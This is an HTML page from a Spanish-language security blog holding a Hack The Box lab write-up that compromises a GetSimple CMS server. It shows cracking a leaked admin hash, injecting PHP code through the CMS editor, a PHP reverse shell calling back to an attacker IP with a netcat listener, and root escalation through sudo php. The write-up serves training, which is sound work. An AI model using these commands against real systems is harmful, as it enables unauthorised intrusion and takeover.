@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head><title>
+    
+    Comprobación De Conocimentos | 
+    
+    CHL Blog
+</title>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<link rel="canonical" href="https://chlorenzo.com/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-getting-started---knowledge-check-comprobaci%C3%B3n-de-conocimientos/" />
+<link rel="icon" type="image/png" href="https://chlorenzo.com/image/favicon.ico">
+
+
+<meta name="description" content="
+    Este es un reto muy bueno para empezar la parte de pentesting, vamos a tocar una pagina web y las distintas fases que debemos dominar.
+    "
+/>
+<meta property="og:description" content="
+    Este es un reto muy bueno para empezar la parte de pentesting, vamos a tocar una pagina web y las distintas fases que debemos dominar.
+    " 
+/>
+
+
+
+
+<meta property="og:title" content="Comprobación de Conocimentos" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://chlorenzo.com/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-getting-started---knowledge-check-comprobaci%C3%B3n-de-conocimientos/" /><meta property="article:section" content="pagina_web" />
+<meta property="article:published_time" content="2025-04-07T00:00:00+00:00" />
+<meta property="article:modified_time" content="2025-04-07T00:00:00+00:00" />
+
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Comprobación de Conocimentos">
+  <meta name="twitter:description" content="Este es un reto muy bueno para empezar la parte de pentesting, vamos a tocar una pagina web y las distintas fases que debemos dominar.">
+
+
+  <meta itemprop="name" content="Comprobación de Conocimentos">
+  <meta itemprop="description" content="Este es un reto muy bueno para empezar la parte de pentesting, vamos a tocar una pagina web y las distintas fases que debemos dominar.">
+  <meta itemprop="datePublished" content="2025-04-07T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-04-07T00:00:00+00:00">
+  <meta itemprop="wordCount" content="710">
+  <meta itemprop="keywords" content="HTB,Pentesting,Web">
+
+
+
+
+<link rel="stylesheet" href="https://chlorenzo.com/main.min.css">
+
+
+
+
+
+<script src="https://chlorenzo.com/bundle.js"></script>
+
+
+
+
+
+
+
+<script data-ad-client="adsense-key" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-4G9W14SLG4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4G9W14SLG4');
+</script>
+
+
+
+
+
+
+</head>
+
+<body><header id="header">
+  <div class="top-bar">
+    <div class="container-md">
+
+      <div class="row align-items-center">
+        <div class="col-3 col-sm-4 social-buttons d-none d-sm-block">
+          <ul>
+    
+    
+
+    
+    <li>
+        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
+            <i class="fab fa-youtube"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://www.instagram.com/19chl96/" target="_blank">
+            <i class="fab fa-instagram"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://github.com/chernadez321" target="_blank">
+            <i class="fab fa-github"></i></a>
+    </li>
+    
+
+    
+
+    
+    <li>
+        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
+            <i class="fab fa-linkedin"></i></a>
+    </li>
+    
+
+</ul>
+        </div>
+
+        <div class="ra-toggler col-3 col-sm-4 d-block d-sm-none">
+          <button class="bg-dark" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+            <i class="fas fa-bars"></i>
+          </button>
+        </div>
+
+        <div class="col-6 col-sm-4">
+          <h2 class="title"><a href="https://chlorenzo.com/">CHL Blog</a></h2>
+        </div>
+
+        
+        <div class="col-3 col-sm-4">
+          <div class="col col-md-8 offset-md-4 d-none d-sm-block">
+            <form id="cse-search-box-form-id" class="input-group search-bar" onsubmit="return executeQuery('lg');"
+              role="search">
+              <input id="cse-search-input-box-id" type="text" class="form-control" placeholder="Search">
+              <button class="btn" type="submit">
+                <i class="fa fa-search"></i>
+              </button>
+            </form>
+          </div>
+        </div>
+        
+
+      </div>
+    </div>
+  </div>
+
+  <div class="container-md">
+    <nav class="navbar navbar-expand-sm navbar-dark bg-dark sticky-top">
+      <div class="collapse navbar-collapse" id="navbarNav">
+        <ul class="navbar-nav mx-auto">
+
+          <li class="nav-item d-block d-sm-none">
+            <ul class="social-buttons">
+              <ul>
+    
+    
+
+    
+    <li>
+        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
+            <i class="fab fa-youtube"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://www.instagram.com/19chl96/" target="_blank">
+            <i class="fab fa-instagram"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://github.com/chernadez321" target="_blank">
+            <i class="fab fa-github"></i></a>
+    </li>
+    
+
+    
+
+    
+    <li>
+        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
+            <i class="fab fa-linkedin"></i></a>
+    </li>
+    
+
+</ul>
+            </ul>
+          </li>
+
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://chlorenzo.com/">
+              Home
+            </a>
+          </li>
+          
+          
+          
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown">
+              Blog
+            </a>
+            <div class="dropdown-menu">
+              
+              
+                <a class="dropdown-item" href="https://chlorenzo.com/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
+              
+              
+              
+                <a class="dropdown-item" href="https://chlorenzo.com/pagina_web/blog/write-ups/">Write-ups</a>
+              
+              
+              
+                <div class="dropdown-divider"></div>
+              
+              
+              
+                <a class="dropdown-item" href="https://chlorenzo.com/tags/">Búsqueda por etiquetas</a>
+              
+              
+            </div>
+          </li>
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://chlorenzo.com/pagina_web/trayectoria/">
+              Trayectoria
+            </a>
+          </li>
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://chlorenzo.com/pagina_web/contact/">
+              Contacto
+            </a>
+          </li>
+          
+          
+        </ul>
+
+        
+        <form id="cse-search-box-form-id2" class="d-flex search-bar d-block d-sm-none"
+          onsubmit="return executeQuery('xs');" role="search">
+          <input id="cse-search-input-box-id2" type="text" class="form-control" placeholder="Search">
+          <button class="btn" type="submit">
+            <i class="fa fa-search"></i>
+          </button>
+        </form>
+        
+
+      </div>
+    </nav>
+  </div>
+</header>
+
+<main class="blog-content">
+    <div class="container-md">
+        <div class="row">
+            
+            <div class="col-lg-2 d-none d-xl-block">
+                <div class="ad-left-offset"></div>
+                
+            </div>
+
+            <div class="col-md-12 col-lg-8 px-lg-4">
+                
+
+                <h1 class="title">Comprobación de Conocimentos</h1>
+
+                <div class="container-fluid px-0 mb-4">
+                    <div class="row align-items-end">
+                        <div class="col-md-4 date-time">
+                            <span class="date">
+    Apr 7, 2025
+</span>
+                            &centerdot;
+                            <span class="time-to-read">
+    4 mins read</span>
+                        </div>
+
+                        <div class="col-md-8 tags ">
+                            
+                            <a href="https://chlorenzo.com/tags/htb"><span
+                                    class="tag bg-dark">HTB</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/pentesting"><span
+                                    class="tag bg-dark">Pentesting</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/web"><span
+                                    class="tag bg-dark">Web</span></a>
+                            
+                        </div>
+                    </div>
+                </div>
+
+                
+
+                <p><img src="../../../../../images/Miniaturas/Getting_Started.png" alt="">
+<strong>Objetivos:</strong> El primer objetivo de este reto es una vez comprometido el servidor pongamos el contenido de la flag del archivo user.txt.
+Mientras que el segundo objetivo es poner el contenido de la flag del archivo root.txt una vez ya hallamos escalado privilegios.</p>
+<p><img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/ipobjetivo.png" alt="">
+<img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/Objetivo2.png" alt=""></p>
+<p>Antes de empezar revisamos un poco lo que nos dice la propia platafoma para que tengamos una guía del orden en que debemos trabajar.
+<img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/Inicio.png" alt=""></p>
+<p>Empezamos con <strong>Reconocimiento</strong>:
+Hacemos un escaneo inicial con <strong>nmap</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- -n -Pn --open -sS --min-rate <span style="color:#ae81ff">1000</span> <span style="color:#f92672">{</span>Ip<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/nmap1.png" alt="">
+<strong>Párametros</strong>:
+-p- para que me escanee todos los puertos
+-n para que no haga resolución DNS
+-Pn No haga descubrimiento de hosts
+&ndash;open para que solo muestre los puertos abiertos
+-sS hacemos el escaneo SealthScan que es muy rápido y eficiente.
+&ndash;min-rate 1000 para que escanee mínimo 1000 paquetes por segundo.</p>
+<p>Obtenemos 2 puertos abiertos (22 y 80)</p>
+<p>Vamos a recopilar mas información:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p22,80 -n -Pn -sCV <span style="color:#f92672">{</span>Ip<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/nmap2.png" alt="">
+<strong>Párametros</strong>:
+-p22,80 para que me escanee solo estos 2 puertos
+-n para que no haga resolución DNS
+-Pn No haga descubrimiento de hosts
+-sCV hacemos el escaneo donde buscamos las versiones de los servicios que están corriendo en el servidor y los scripts que básicos que detecte que se puedan aplicar.</p>
+<p>Obtenemos las versiones de ambos servicios, más el sistema operativo del servidor, de todas formas vamos a ir comprobando esta información.</p>
+<p>Usamos <strong>whatweb</strong> para ir contrastando la información del puerto 80</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whatweb http://<span style="color:#f92672">{</span>IP<span style="color:#f92672">}</span>:80
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/whatweb.png" alt=""></p>
+<p>También podemos contrastar con <strong>curl:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -I http://<span style="color:#f92672">{</span>IP<span style="color:#f92672">}</span>:80
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/curl.png" alt=""></p>
+<p>Vamos a echarle un vistazo a la página web:
+<img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/web1.png" alt=""></p>
+<p>Y leemos que están usando un CMS llamado GetSimple. Podemos <strong>investigar</strong> un poco en google a ver de que se trata.</p>
+<p>Podemos proceder a hacerle fuzzing a esta dirección a ver si encontramos rutas o archivos accesibles.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://<span style="color:#f92672">{</span>IP<span style="color:#f92672">}</span> -w <span style="color:#f92672">{</span>/path/to/wordlist/<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/gobuster.png" alt="">
+Con esto podemos ir trabajando vamos con data
+<img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/data.png" alt="">
+Dentro de estas carpetas encontramos</p>
+<ul>
+<li>http://{IP}/data/other/website.xml</li>
+<li>Que el sitio tiene por nombre <a href="http://gettingstarted.htb/">http://gettingstarted.htb/</a> -&gt; Esto lo podemos añadir a nuestro /etc/hosts.</li>
+<li>http://{IP}/data/other/authorization.xml</li>
+<li>Apikey -&gt; <code>&lt;![CDATA[ 4f399dc72ff8e619e327800f851e9986 ]]&gt;</code></li>
+<li>http://{IP}/data/other/plugins.xml</li>
+<li>Obtenemos 2 plugins (anonymous_data.php y InnovationPlugin.php)</li>
+<li>http://{IP}/data/users/admin.xml</li>
+<li>Obtenemos un correo <a href="mailto:admin@gettingstarted.com">admin@gettingstarted.com</a></li>
+<li>Obtenemos el usuario admin</li>
+<li>Y obtenemos esto <strong>PWD</strong> d033e22ae348aeb5660fc2140aec35850c4da997 <strong>PWD</strong></li>
+</ul>
+<p>Podemos intentar decodificar esta cadena, tiene pinta de ser un password. <a href="https://crackstation.net/">Crackstation</a></p>
+<p><img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/hash.png" alt=""></p>
+<p>Y vemos que efectivamente al crackearlo tenemos como resultado <strong>admin</strong>.</p>
+<p>Seguimos buscando y obtenemos un panel de autenticación
+http://{IP}/admin/
+<img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/admin.png" alt="">
+Probamos las credenciales que tenemos y para adentro!
+<img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/autenticado.png" alt=""></p>
+<p>Recopilamos informacion en el sitio:</p>
+<ul>
+<li>GetSimple Version 3.3.15</li>
+<li>Vemos que podemos crear y editar páginas</li>
+<li>Vemos que podemos editar temas y componentes</li>
+<li>Podemos también editar el sitemap</li>
+</ul>
+<p><img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/wapp.png" alt=""></p>
+<ul>
+<li>Vemos que esta hecho con php</li>
+<li>Hay que tener en cuenta que tanto las páginas, temas y componentes son archivos php, con lo cual podemos intentar dar una instrucción a ver si el servidor nos la interpreta.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;id&#39;</span>); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010"> 
+</span></span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/component1.png" alt="">
+<img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/component2.png" alt=""></p>
+<p>Dado que el servidor nos interpreta la instrucción tenemos ejecución remota de comandos en el servidor. Con lo que debemos intentar lanzarnos una bash a nuestro equipo atacante para trabajar mejor.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;php -r \&#39;$sock=fsockopen(&#34;10.10.15.64&#34;,4444);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);\&#39;&#39;</span>); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/component3.png" alt="">
+Nos ponemos en escucha con netcat:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/rshell1.png" alt="">
+Y hacemos la petición a http://{IP}
+Y vemos que tenemos una terminal /bin/sh/
+<img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/rshell2.png" alt=""></p>
+<p>Lo siguiente que debemos hacer es darle tratamiento a la tty para poder trabajar cómodos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/rshell3.png" alt=""></p>
+<p>Nos podemos mover en el servidor para encontrar la primera flag
+<img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/flag1.png" alt=""></p>
+<p>Vale el siguiente objetivo es escalar privilegios a root para obtener la segunda flag
+Ejecutamos el siguiente comando para ver que comandos podemos ejecutar como root sin necesidad de contraseña:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/escalada.png" alt=""></p>
+<p>Y vemos que podemos ejecutar el comando php sin contraseña, lo siguiente que debemos hacer es buscar algún script con php que nos permita escalar privilegios.
+Recomiendo este recurso que tiene muchas funciones para escalar privilegios que podemos probar:</p>
+<p><img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/escalada2.png" alt="">Ponemos php y tocamos en sudo que es lo que tenemos ahora mismo posible ejecutar:
+<img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/escalada3.png" alt="">
+Vale lo que vamos a hacer una pequeña modificación al comando para ejecutarlo de una:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo php -r <span style="color:#e6db74">&#34;system(&#39;/bin/bash&#39;);&#34;</span>
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/escalada4.png" alt="">
+Entonces lo que vamos a hacer a continuación es buscar la flag de root.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /root
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>cat root.txt
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/Getting_Started_lab_1/escalada5.png" alt=""></p>
+<p>Tenemos la 2da flag.</p>
+<p>Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir que podemos mejorar te lo voy a agradecer un montón.</p>
+
+
+                <div id="social-media-share">
+	<p><i>Escríbeme por cualquiera de las vías</i></p>
+	
+	<div class="share-buttons">
+	    
+		<a href="https://www.instagram.com/19chl96/" 
+   			target="_blank" 
+   			title="Sígueme en Instagram">
+    		<img src=https://chlorenzo.com/icons/45px/instagram.png alt="Instagram">
+		</a>
+
+		<a  href="https://www.linkedin.com/in/chlinked/"
+	        onclick="socialMediaPopUp(this.href, '', 900, 500); return false;"
+	        title="Share on LinkedIn. Opens in a new window." >
+	        <img src=https://chlorenzo.com/icons/48px/linkedin.png>
+	    </a>
+
+	    <a href="https://mail.google.com/mail/?view=cm&fs=1&to=chlorenzo96@gmail.com&su=Para Carlos&body=Hola." 
+   		   target="_blank" 
+   		   title="Enviar correo usando Gmail">
+    	<img src=https://chlorenzo.com/icons/48px/email.png alt="Email">
+		</a>
+
+		
+
+	</div>
+</div>
+
+
+
+                
+                <br>
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    (function () {
+        
+        
+        if (window.location.hostname == "localhost")
+            return;
+
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = '';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+            </div>
+
+            <div class="col-lg-2 d-none d-xl-block">
+                <div class="ad-right-offset"></div>
+                
+            </div>
+        </div>
+    </div>
+</main>
+
+<footer class="bg-dark text-light py-4">
+    <div class="container-md">
+        <div class="row justify-content-center">
+            <div class="col-12">
+                <nav class="navbar navbar-expand-sm navbar-dark bg-dark justify-content-center">
+                    <ul class="navbar-nav">
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://chlorenzo.com/">Home</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://chlorenzo.com/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://chlorenzo.com/pagina_web/blog/write-ups/">Write-ups</a>
+                        </li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+    </div>
+    <div class="text-center mt-3">
+        <p>© 2025 Carlos Hernández Lorenzo</p>
+    </div>
+</footer>
+
+
+<script async src="https://cse.google.com/cse.js?cx=google-cse-key"></script>
+<gcse:searchresults-only></gcse:searchresults-only>
+
+</body>
+
+</html>
